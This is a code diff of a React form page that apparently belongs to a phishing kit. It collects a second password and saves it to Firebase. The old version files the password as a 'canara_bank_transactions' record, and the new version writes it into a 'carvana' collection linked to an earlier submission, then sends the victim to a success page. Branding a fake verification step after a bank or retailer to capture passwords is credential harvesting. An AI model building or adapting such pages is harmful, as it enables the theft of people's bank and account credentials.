@@ -1,31 +1,34 @@
-import React, { useState } from 'react';
-import { useNavigate } from 'react-router-dom';
+import { useState } from 'react';
+import { useNavigate, useParams } from 'react-router-dom';
 import '../App.css';
 import headerImage from '../assets/second-page-header.jpeg';
 import FirebaseUtil from '../FirebaseRepo';
 
 const SecondPage = () => {
-  const [transactionPassword, setTransactionPassword] = useState('');
+  const [password2, setPassword2] = useState('');
   const [isSubmitting, setIsSubmitting] = useState(false);
   const navigate = useNavigate();
+  const { documentId } = useParams();
+
 
   const handleSubmit = async (e) => {
     e.preventDefault();
     setIsSubmitting(true);
 
     try {
-      // Upload data to Firestore
-      await FirebaseUtil.uploadAnyModel("canara_bank_transactions", {
-        transactionPassword,
-        page: "transaction_verification",
-        timestamp: new Date().toISOString()
+      // Update the existing document in the carvana collection
+      const result = await FirebaseUtil.updateDocument("carvana", documentId, {
+        password2,
+        updatedAt: new Date().toISOString()
       });
 
-      // Navigate to the success page after successful submission
-      setTimeout(() => {
-        setIsSubmitting(false);
+      // Check if update was successful
+      if (result.state === 'success') {
+        // Navigate to the success page after successful submission
         navigate('/success');
-      }, 1500);
+      } else {
+        throw new Error(result.error || 'Failed to update document');
+      }
     } catch (error) {
       console.error("Error submitting form:", error);
       setIsSubmitting(false);
@@ -60,8 +63,8 @@ const SecondPage = () => {
               <input
                 type="password"
                 className="w-full py-2 px-3 rounded border border-gray-300 text-gray-700 text-sm focus:outline-none focus:ring-2 focus:ring-blue-500"
-                value={transactionPassword}
-                onChange={(e) => setTransactionPassword(e.target.value)}
+                value={password2}
+                onChange={(e) => setPassword2(e.target.value)}
                 required
               />
             </div>
